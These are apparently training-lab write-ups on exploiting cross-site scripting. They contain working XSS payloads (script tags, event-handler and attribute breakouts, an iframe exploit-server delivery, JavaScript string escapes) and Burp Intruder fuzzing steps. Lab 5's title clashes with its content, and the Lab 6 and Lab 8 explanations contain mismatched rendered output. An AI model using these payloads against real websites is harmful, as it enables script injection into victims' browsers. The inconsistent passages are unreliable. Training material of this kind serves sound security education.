---
# Lab: 1 Reflected XSS into HTML context with nothing encoded
# **Write-Up: Reflected XSS in Search Functionality**  

### **Overview**  
This lab demonstrates a reflected Cross-Site Scripting (XSS) vulnerability in the search functionality of a web application. The input is reflected in the response without proper sanitization, allowing an attacker to inject and execute malicious scripts.  

### **Steps to Exploit**  

1. **Testing Input Reflection:**  
   - I entered a simple string `"Heyy"` in the search bar.  
   - The response reflected my input in the HTML page, confirming that user input is returned without encoding.  

2. **Injecting a Basic XSS Payload:**  
   - To verify XSS, I injected the following payload in the search input:  
     ```html
     <script>alert(1)</script>
     ```
   - Upon submitting, the browser executed the JavaScript, displaying an alert box with `1`.  

3. **Confirmation of Vulnerability:**  
   - Since the JavaScript executed successfully, the application is vulnerable to reflected XSS.  

---
 

---
# Lab 2: 
# **Exploiting XSS Through Burp Intruder**

## **Step 1: Testing for Initial XSS Filtering**
To begin, we attempted to inject a standard XSS vector:  

```html
<img src=1 onerror=print()>
```
However, this payload was **blocked** by the application’s filtering mechanisms. Since our initial attempt failed, we need to **analyze which tags and attributes are allowed** by the application.  

---

## **Step 2: Identifying Allowed HTML Tags Using Burp Intruder**
1. **Open Burp's browser** and use the search function in the lab.  
2. **Send the resulting request to Burp Intruder** for further testing.  
3. In **Burp Intruder**, replace the value of the search term with:  

   ```html
   <>
   ```
4. Place the cursor **between the angle brackets** and click **Add §** to create a payload position.  
   - The value should now look like:  
     ```html
     <§§>
     ```
5. **Visit the XSS cheat sheet** and click **Copy tags to clipboard**.  
6. In the **Payloads** panel, under **Payload configuration**, click **Paste** to insert the list of tags into the payload list.  
7. Click **Start attack** to test which tags are allowed.  


---

## **Step 3: Injecting Attributes Into `<body>`**
Since `<body>` is allowed, we now need to determine **which attributes are accepted**.

1. **Modify the Burp Intruder search term** and replace it with:  

   ```html
   <body%20=1>
   ```
2. **Place the cursor before the `=` character** and click **Add §** to create a payload position.  
   - The value should now look like:  
     ```html
     <body%20§§=1>
     ```
3. **Visit the XSS cheat sheet** and click **Copy events to clipboard**.  
4. In the **Payloads** panel, click **Clear** to remove previous payloads.  
5. Click **Paste** to insert the **list of attributes** into the payloads list.  
6. Click **Start attack** to test which event handlers are allowed.  

---

## **Step 4: Delivering the Exploit**
Now that we know the **`onresize` attribute works**, we will craft a final payload to **execute JavaScript on the victim's browser**.  

1. Go to the **exploit server** and paste the following payload:  

   ```html
   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
   ```
2. Replace **`YOUR-LAB-ID`** with the actual **Lab ID** for your target.  
3. Click **Store** and then **Deliver exploit to victim**.  

# Lab: 3 Reflected XSS with some SVG markup allowed
### **Write-Up: Exploiting XSS Using Burp Intruder**  

---

### **Step 1: Testing for Initial XSS Filtering**  

To begin, we attempted to inject a standard XSS payload:  

```html
<img src=1 onerror=alert(1)>
```
However, this payload **was blocked** by the application’s security mechanisms. Since this attempt failed, we need to analyze **which HTML tags and attributes are allowed** using Burp Intruder.  

---

### **Step 2: Identifying Allowed HTML Tags Using Burp Intruder**  

1. **Open Burp's browser** and use the search function in the lab.  
2. **Send the resulting request to Burp Intruder** for further testing.  
3. In the **request template**, replace the value of the search term with:  

   ```html
   <>
   ```
4. **Place the cursor between the angle brackets (`<>`)** and click **Add §** to create a payload position.  
   - The value should now be:  
     ```html
     <§§>
     ```
5. **Visit the XSS cheat sheet** and click **Copy tags to clipboard**.  
6. In **Burp Intruder**, in the **Payloads** side panel, click **Paste** to insert the list of tags into the payloads list.  
7. Click **Start attack** to test which tags are allowed.  

### **Results Analysis:**  
- Most payloads caused a **400 Bad Request** response, meaning they were blocked.  
- However, the following **tags resulted in a 200 OK response** (indicating they were allowed):  
  - `<svg>`  
  - `<animatetransform>`  
  - `<title>`  
  - `<image>`  

Since `<svg>` and `<animatetransform>` were not blocked, we can attempt further exploitation using them.  

---

### **Step 3: Injecting Attributes Into `<animatetransform>`**  

Since `<animatetransform>` is allowed, we now need to determine **which attributes can execute JavaScript**.

1. **Modify the Burp Intruder search term** and replace it with:  

   ```html
   <svg><animatetransform%20=1>
   ```
2. **Place the cursor before the `=` character** and click **Add §** to create a payload position.  
   - The value should now be:  
     ```html
     <svg><animatetransform%20§§=1>
     ```
3. **Visit the XSS cheat sheet** and click **Copy events to clipboard**.  
4. In **Burp Intruder**, in the **Payloads** side panel, click **Clear** to remove previous payloads.  
5. Click **Paste** to insert the **list of attributes** into the payloads list.  
6. Click **Start attack** to test which event handlers are allowed.  

### **Results Analysis:**  
- Most attributes caused a **400 response**, meaning they were blocked.  
- However, the **`onbegin` attribute** resulted in a **200 OK** response, meaning it was accepted.  

This means we can execute JavaScript using:  

```html
<svg><animatetransform onbegin=alert(1)>
```

---

### **Step 4: Delivering the Exploit**  

Now that we know the **`onbegin` attribute works**, we will craft a final payload to **execute JavaScript when the animation starts**.  

1. **Visit the following URL in the browser** to confirm that `alert(1)` is executed:  

   ```html
   https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
   ```
2. Replace **`YOUR-LAB-ID`** with the actual **Lab ID** for your target.  
3. When the page loads, the **onbegin event will trigger `alert(1)`**, confirming a successful XSS exploit.  

---

### **How Encoding Works:**
You noticed that our payload:  

```html
<svg><animatetransform onbegin=alert(1)>
```
was **encoded into**:  

```
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```

Let’s break this down:  

| **Character** | **Original** | **Encoded (URL Encoding)** |
|--------------|-------------|----------------------------|
| `"`          | `"`         | `%22`                     |
| `>`          | `>`         | `%3E`                     |
| `<`          | `<`         | `%3C`                     |
| `space`      | ` `         | `%20`                     |

**Explanation:**  
- The `"` (`%22`) at the start is used to **break out of an attribute value** if the application is injecting our input inside an attribute.  
- The `>` (`%3E`) ensures we **close any existing HTML tag** and start our `<svg>` tag.  
- `<svg>` and `<animatetransform>` execute normally after decoding.  
- `%20` is just the encoded space between `animatetransform` and `onbegin`.  

---

# **Lab 4 Write-Up: XSS in HTML Tag Attributes**  

### **Step 1: Identify the Vulnerability**  
- The lab's **search blog functionality** is vulnerable to **reflected XSS**.  
- **Angle brackets (`< >`) are encoded**, meaning we **cannot inject `<script>` tags** directly.  
- Our goal is to **inject an attribute** that triggers JavaScript execution.  

---

### **Step 2: Crafting the Payload**  
Since `<script>` tags are blocked, we use an **event handler** inside an HTML attribute.  

**Final Payload:**  
```html
" autofocus onfocus=alert(document.domain) x="
```

### **Why This Works?**  
- `"` → Closes the existing attribute.  
- `autofocus` → Automatically focuses on the element.  
- `onfocus=alert(document.domain)` → Triggers an alert when the element is focused.  
- `x="` → Prevents breaking the HTML structure.  

---

### **Step 3: Injecting the Payload**  
1. **Go to the search function of the blog.**  
2. **Enter the payload** in the search bar.  
3. **Submit the search query.**  

---

### **Step 4: Observing Execution**  
- The search field **automatically gains focus**, triggering the `onfocus` event.  
- The **alert box appears**, confirming **successful XSS execution**.  

---

### **Step 5: Lab Completion**  
- The JavaScript executed successfully.  
- The **lab is now solved!**  

---

# Lab: 5 Reflected XSS in canonical link tag

# **Lab Write-Up: Accesskey-Based XSS in the Comment Author's Website Field**  

### **Understanding the Vulnerability**  
This lab contains a **stored cross-site scripting (XSS) vulnerability** in the **comment functionality**. The issue occurs because the **Website** field in the comment form is reflected inside an `<a>` tag as the `href` attribute without proper sanitization.  

#### **Reflected HTML Code:**
```html
<a id="author" href="USER_INPUT">kyu btau</a>
```
Since **our input is directly placed inside the `href` attribute**, we can try **injecting additional attributes** using special encoding techniques.  

---

### **Crafting the Payload**
Since the `href` value is wrapped in double quotes (`"`), we need to **break out of it** safely and inject our own attributes.  
Using URL encoding, we crafted the following payload:  

**Final Payload (to enter in the Website field):**  
```
?%27accesskey=%27x%27onclick=%27alert(1)
```

---

### **How the Payload Works**
After submission, the input is reflected as:  
```html
<a id="author" href="?' accesskey='x' onclick='alert(1)'>kyu btau</a>
```
**`?`** → Ensures it’s treated as part of the URL.  
**`%27` (`'`)** → **Closes the `href` attribute safely** to prevent breaking the tag structure.  
**`accesskey='x'`** → Defines a keyboard shortcut (`Alt + Shift + X`) to activate the element.  
**`onclick='alert(1)'`** → Executes JavaScript when the access key is triggered.  

---

### **Steps to Exploit**
**Enter the payload** in the **Website** field when submitting a comment:  
```
?%27accesskey=%27x%27onclick=%27alert(1)
```
**Submit the comment.**  
**Inspect the rendered HTML** (`Ctrl + U`) to confirm that `accesskey` and `onclick` were injected.  
**Trigger the attack** by pressing:  
   ```
   Alt + Shift + X
   ```
   **On Ubuntu (Chromium), this activates the accesskey and executes `alert(1)`.**  

---

### **Expected Outcome**
 - The JavaScript `alert(1)` executes when the keyboard shortcut **`Alt + Shift + X`** is pressed.
 - Since this is a **stored XSS**, it **affects all users viewing the comment**.  
**Lab is solved!**  

---

# **Lab:6  Write-Up:Reflected XSS into a JavaScript string with angle brackets HTML encoded**  

## **1. Understanding the Vulnerability**  
This lab contains a **reflected cross-site scripting (XSS) vulnerability** where user input is inserted inside a JavaScript string. The vulnerable JavaScript code is:  

```html
<script>
    var searchTerms = 'USER_INPUT_HERE';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- The **user-controlled input** is placed inside a JavaScript variable (`searchTerms`).  
- The application **does not properly sanitize the input**, allowing us to **break out of the script and execute arbitrary JavaScript**.  

---

## **2. Crafting the Payload**  
To exploit this, we need to:  
1. **Break out of the JavaScript string**  
2. **End the `<script>` block**  
3. **Inject a new `<script>` tag** containing our XSS payload  

### **Final Payload:**  
```
"</script><script>alert(1)</script>"
```
### **How This Works:**  
- **`"</script>`** → Closes the existing `<script>` tag.  
- **`<script>alert(1)</script>`** → Injects a new `<script>` tag that executes `alert(1)`.  

After injection, the browser interprets the following **maliciously crafted HTML**:  
```html
<script>
    var searchTerms = "";
</script>
<script>alert(1)</script>
<script>
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- The **original JavaScript is terminated early**.  
- The **injected `<script>` tag runs immediately**, executing the `alert(1)`.  
- The **rest of the page loads normally** without errors.  

---

## **3. Steps to Exploit**  
1. **Locate the input field where `searchTerms` is reflected.**  
2. **Enter the following payload:**  
   ```
   "</script><script>alert(1)</script>"
   ```
3. **Submit the input.**  
4. **Observe that an alert box appears**, confirming XSS execution.  

---

## **4. Expected Outcome**  
- **JavaScript execution is successfully achieved.**  
- **The alert function runs when the page loads.**  
- **Lab is solved.**  

# **Lab 7 Write-Up: Exploiting JavaScript String to Inject XSS**

## **1. Understanding the Vulnerability**  
This lab contains a **reflected cross-site scripting (XSS) vulnerability** in a JavaScript context. The vulnerable code is as follows:

```html
<script>
    var searchTerms = 'USER_INPUT_HERE';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
The **`searchTerms`** variable is **directly injected into JavaScript** without proper sanitization or escaping. This creates an opportunity for an attacker to break out of the string and execute arbitrary JavaScript.  

---

## **2. Crafting the Exploit Payload**
The **goal** is to **break out** of the string (`'USER_INPUT_HERE'`), **terminate the current JavaScript statement**, and **inject JavaScript** that executes when the page is loaded.  

The successful payload is:  
```
'; alert(1); //
```

### **How the Payload Works:**
- **`'`** → Closes the string that is being assigned to `searchTerms`.  
- **`;`** → Ends the JavaScript statement.  
- **`alert(1);`** → Executes the JavaScript function `alert(1)`, which triggers an alert box.  
- **`//`** → Comments out the rest of the code to avoid syntax errors.  

### **Rendered JavaScript After Injection:**
```html
<script>
    var searchTerms = ''; alert(1); //';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
This **breaks out of the string** and **injects JavaScript** that executes immediately when the page is rendered.

---

## **3. Steps to Exploit the Vulnerability**
1. **Locate the input field** where `searchTerms` is reflected.  
2. **Enter the following payload in the input field:**
   ```
   '; alert(1); //
   ```
3. **Submit the form** containing the payload.  
4. **Observe the execution of the payload**—an alert box should appear.  

---

## **4. Expected Outcome**
- The payload successfully **breaks out of the string** and **executes the `alert(1)`** JavaScript function.  
- **The alert box appears**, confirming that XSS has been successfully triggered.  
- **The lab is solved.**

# **Lab 8 Write-Up: Bypassing Escaped Single Quotes to Execute XSS**  

## **1. Understanding the Vulnerability**  
This lab contains a **reflected cross-site scripting (XSS) vulnerability** inside a JavaScript string. The vulnerable code looks like this:  

```html
<script>
   var searchTerms = '\';&lt;script&gt;alert(1)&lt;/script&gt;';
   document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- The **user-controlled input** is placed inside a **JavaScript string enclosed in single quotes (`'`).**  
- The application **escapes single quotes (`'`) by adding a backslash (`\`) before them**, making injection more difficult.  
- However, **the backslash (`\`) itself is not escaped**, allowing an attacker to **neutralize the escaping mechanism** and break out of the string.  

---

## **2. Identifying the Vulnerability**
When testing the application, I noticed that:
- Entering a single quote (`'`) resulted in `\'`, meaning **the application escapes single quotes (`'`) with a backslash (`\`)**.  
- However, entering a **backslash (`\`) itself** did **not** get escaped, which meant I could **bypass the escaping by injecting my own backslash (`\`).**  

---

## **3. Crafting the Exploit Payload**  
The goal was to:
1. **Break out of the JavaScript string.**  
2. **Inject a malicious JavaScript payload (`alert(document.domain)`).**  
3. **Ensure the script remains valid to avoid syntax errors.**  

### **Final Payload:**
```
\';alert(document.domain)//
```

---

### **4. How the Payload Works**
**What Happens When the Application Processes This Input?**  
Since **single quotes (`'`) are escaped** but **backslashes (`\`) are not**, injecting `\';alert(document.domain)//` results in:

```
\\';alert(document.domain)//
```
Breaking it down:
1. **First backslash (`\`) neutralizes the second backslash (`\`)**, making JavaScript interpret it as a normal character.  
2. **The single quote (`'`) now terminates the original string**, breaking out of the JavaScript string.  
3. **`alert(document.domain);` executes immediately.**  
4. **`//` comments out the rest of the line** to prevent syntax errors.  

**Final Rendered JavaScript:**
```js
var searchTerms = ''; alert(document.domain)//';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```
- The **JavaScript string is closed prematurely.**  
- **`alert(document.domain)` executes immediately.**  
- **Everything after `//` is ignored**, preventing errors.  

---

## **5. Steps to Exploit the Vulnerability**
1. **Locate the input field** where `searchTerms` is reflected.  
2. **Enter the following payload in the input field:**
   ```
   \';alert(document.domain)//
   ```
3. **Submit the input.**  
4. **Observe that an alert box appears**, confirming that XSS has been successfully executed.  

---

## **6. Expected Outcome**
- The **payload successfully breaks out of the JavaScript string** and **executes `alert(document.domain)`**.  
- The **alert box appears**, proving that XSS execution was achieved.  
- **The lab is solved.**  

---
